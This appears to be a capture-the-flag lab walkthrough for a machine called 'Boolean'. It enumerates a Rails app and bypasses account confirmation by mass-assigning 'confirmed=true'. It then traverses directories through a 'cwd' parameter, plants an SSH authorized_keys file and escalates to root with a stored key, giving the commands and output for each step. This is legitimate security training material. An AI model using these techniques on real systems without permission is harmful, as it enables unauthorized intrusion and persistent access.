____

# Exploitation Guide for Boolean

## Enumeration

We begin the enumeration process with an `nmap` scan.

```
kali@kali:~$ sudo nmap -sV -sC 192.168.120.159
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-04 16:19 WIB
Nmap scan report for 192.168.120.159
Host is up (0.00077s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6d:54:5e:b5:63:4c:22:40:36:26:be:ae:4d:85:dd:7a (RSA)
|   256 1e:fc:44:32:5b:65:eb:a9:4d:1f:e7:f6:6c:06:1a:13 (ECDSA)
|_  256 96:69:d0:1b:0b:af:96:9c:98:a0:29:98:53:d6:f4:af (ED25519)
80/tcp   open   http
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.0 403 Forbidden
...
| http-title: Boolean
|_Requested resource was http://192.168.120.159/login
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.83 seconds
```

From the output we see ports `22` and `80` open on the target machine.

Starting with port `80` we see the following webpage.

<!--screenshot-->

We can proceed by enumerating all possible paths on port `80` using `dirb`.

```
kali@kali:~$ dirb http://192.168.120.159
...
URL_BASE: http://192.168.120.159/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.120.159/ ----
+ http://192.168.120.159/404 (CODE:200|SIZE:1722)
+ http://192.168.120.159/500 (CODE:200|SIZE:1635)
+ http://192.168.120.159/filemanager (CODE:302|SIZE:94)
+ http://192.168.120.159/login (CODE:200|SIZE:2394)
+ http://192.168.120.159/register (CODE:200|SIZE:2746)
...
```

Checking the **404** pages reveals the following:

```
kali@kali:~$ curl http://192.168.120.159/404
...
  .rails-default-error-page div.dialog {
...
  .rails-default-error-page div.dialog > div {
...
  .rails-default-error-page h1 {
...
  .rails-default-error-page div.dialog > p {
...

<body class="rails-default-error-page">
  <!-- This file lives in public/404.html -->
```

We see the framework uses [Rails](https://rubyonrails.org/), while the `login` and `register` paths return `200 OK` responses, the `filemanager` path stands out.

Judging by the name it is most likely a file upload feature which is almost always worth checking out.

```
kali@kali:~$ curl -sw '\n' http://192.168.120.159/filemanager
<html><body>You are being <a href="http://192.168.120.159/login">redirected</a>.</body></html>
```

Unfortunately it gets redirected to `/login` page, we will need to register a valid account.


Notice the footer text describes a type of file storage manager just like the `filemanager` path we discovered.


## Exploitation

This account confirmation page would appear after logging in.


Any attempt to go to any other pages like `/filemanager` will always gets redirected to this page.

As we're unable to authenticate as an offsec employee there is no way of receiving the confirmation link sent to the email.

There is an option to edit the email in case of typo, let attempt to use _Burp Suite_ to capture the request and responses.


We receive a `JSON` response with an `email` field reflected back on the confirmation page.

If we look closely, there is also a `confirmed` field with a boolean value `false`.

This field is most likely an indicator for the backend to tell if the account is already confirmed and to lock it out if it's not.

We've found out earlier what the web framework is used, a google search for _Rails common web vulnerability_ will lead us [here](https://guides.rubyonrails.org/v2.3.11/security.html) specifically the [Mass Assignment](https://guides.rubyonrails.org/v2.3.11/security.html#mass-assignment) vulnerability which looks promising.

The URL example is using `GET` while we deal with `POST` requests with `user[email]=yoman@offsec.com` parameters.

While the example was adding an `admin` attribute, we'll add `confirmed` instead with a boolean value `true` which will look like this `user[confirmed]=true` then send the request and see what happens.

We notice the `confirmed` value is now set to `true`, let's attempt to reload the confirmation page again.


After successfully bypassing the confirmation page, the file upload feature appears just like we suspect.

Let's create a test file and then try upload and download it.

```
kali@kali:~$ echo just a test file > test.txt
kali@kali:~$ ls -l test.txt
-rw-r--r-- 1 kali kali 17 Mar 20 13:39 test.txt
kali@kali:~$ cat test.txt
just a test file
```


Notice the changes in the URL bar when trying to download the file that gets uploaded, the `file=test.txt` parameter is interesting and usually the first sign to go and try a good ol' dot slash trick like `../../../etc/passwd` but unfortunately, this time it won't get us anywhere.

Now if we look closely, there is `cwd` parameter that does not have values, it kinda looks like the `pwd` command on _linux_ which used to print our (c)urrent (w)orking directory.

Let's use the same trick on this parameter and see what happens.


We've managed to traverse the path and go up to other directories using `cwd` parameters.

Since other directories are now browseable, we could potentially enumerate further by reading `passwd` or other sensitive files. However, there is a directory that stands out right away which is `.ssh/`, let's try to go into that directory.

Great, we're able to enter the directory which means the web service is likely run by the same user that owns this directory and has full permission.

There is a `keys/` directory which screams for private keys but let's do better than that, let's generate RSA private and public key, rename the public key to `authorized_keys` and then upload it.

```
kali@kali:~$ ssh-keygen -q -N '' -f sshkey
kali@kali:~$ ls -l sshkey*
-rw------- 1 kali kali 2590 Mar 20 19:33 sshkey
-rw-r--r-- 1 kali kali  563 Mar 20 19:33 sshkey.pub
kali@kali:~$ mv sshkey.pub authorized_keys
```

Awesome! the public key successfully uploaded, let's try logging in through SSH with the private key.

```
kali@kali:~$ ssh -i sshkey remi@192.168.120.159
The authenticity of host '192.168.120.159 (192.168.120.159)' can't be established.
...
Linux boolean 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
...
remi@boolean:~$
```

# Privilege Escalation

After logging in as user `remi`, there is an alias that can be used to escalate to root easily.

```
remi@boolean:~$ alias
alias ls='ls --color=auto'
alias root='ssh -l root -i ~/.ssh/keys/root 127.0.0.1'
remi@boolean:~$ root
Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
Disconnected from 127.0.0.1 port 22
```

Unfortunately the attempt was failed due to **Too many authentication failures**, a google search for the error message will lead us [here](https://www.tecmint.com/fix-ssh-too-many-authentication-failures-error/).

Apparently this happened because of an SSH agent that would try to login with all identity keys that were added.

```
remi@boolean:~$ ls -l .ssh/keys/
total 16
-rw------- 1 remi remi 1823 Feb 23 20:40 id_rsa
-rw------- 1 remi remi 1823 Feb 23 20:40 id_rsa.1
-rw------- 1 remi remi 1823 Feb 23 20:40 id_rsa.2
-rw------- 1 remi remi 1823 Feb 23 20:40 root
```

Using the `IdentitiesOnly` option with a boolean value `true` or `yes` will force SSH to explicitly use the identity specified in the command line.

```
remi@boolean:~$ ssh -l root -i ~/.ssh/keys/root 127.0.0.1 -o IdentitiesOnly=true
Linux boolean 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
...
root@boolean:~# whoami
root
```
